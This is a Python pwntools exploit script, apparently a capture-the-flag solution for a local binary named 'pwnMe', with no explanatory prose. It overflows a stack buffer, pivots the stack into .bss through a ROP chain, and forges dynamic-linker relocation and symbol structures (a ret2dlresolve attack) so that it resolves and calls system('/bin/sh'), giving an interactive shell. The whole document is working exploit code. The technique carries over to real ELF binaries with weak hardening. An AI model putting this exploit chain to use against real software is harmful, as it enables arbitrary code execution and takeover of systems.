leave_ret = 0x0000000000401159
ret = 0x000000000040101a
prdi_ret = 0x00000000004011c3
prsi_r15_ret = 0x00000000004011c1

addr_main = 0x401136
read_plt = 0x401040
read_got = 0x404018

from pwn import *
elf = ELF("./pwnMe")
p = elf.process()
# gdb.attach(p)

STRTAB = 0x400420
SYMTAB = 0x4003c0
JMPREL = 0x4004b8

resolver = 0x401020 
bss = 0x404000			# 0x404000 -> 0x405000 | 0x1000
padding = "A" * 0x20	# Not rbp
base_stage = 0x404000 + 0xa00

# Payload 1
buf = ""
buf += padding
buf += p64(base_stage)
buf += p64(prsi_r15_ret)
buf += p64(base_stage)
buf += p64(0)
buf += p64(read_plt)
buf += p64(leave_ret)
buf = buf.ljust(0x90, b'A')

# Fake Info
forged_area = base_stage + 40 # 64 - 8 * 3

addr_rela = forged_area
align_rela = 24 - ((addr_rela - JMPREL) % 24)
addr_rela = addr_rela + align_rela

addr_sym = addr_rela + 24
align_sym = 24 - ((addr_sym - SYMTAB) % 24)
addr_sym = addr_sym + align_sym

log.info("Align rela: " + hex(align_rela))
log.info("Align sym: " + hex(align_sym))

addr_string = addr_sym + 24

rela_offset = (addr_rela - JMPREL) // 24
index_sym = (addr_sym - SYMTAB) // 24
r_info = (index_sym << 32) | 0x7
st_name = addr_string - STRTAB

# Fake Struct
fake_rela_struct =  p64(read_got) + p64(r_info) + p64(0)

fake_sym_struct = p32(st_name) + p32(0x12) + p64(0) + p64(0)

log.info("Sym struct addr: " + hex(addr_sym))
log.info("Rela struct addr: " + hex(addr_rela))
log.info("String addr: " + hex(addr_string))

# Payload 2
fake = ""
fake += "AAAABBBB"
# fake += p64(prsi_r15_ret)
# fake += p64(0)
# fake += p64(0)
fake += p64(prdi_ret)
fake += p64(base_stage + 120)	# "/bin/sh"
fake += p64(resolver)
fake += p64(rela_offset)

print("Start fake struct in fake + " + str(len(fake)))

fake += "A" * align_rela
fake += fake_rela_struct

fake += "A" * align_sym
fake += fake_sym_struct
fake += "system\x00\x00"

print("Start /bin/sh in fake + " + str(len(fake)))

fake += "/bin/sh\x00"

print("Length payload 2: " + str(len(fake)))

p.send(buf)
sleep(1)
p.send(fake)

p.interactive()
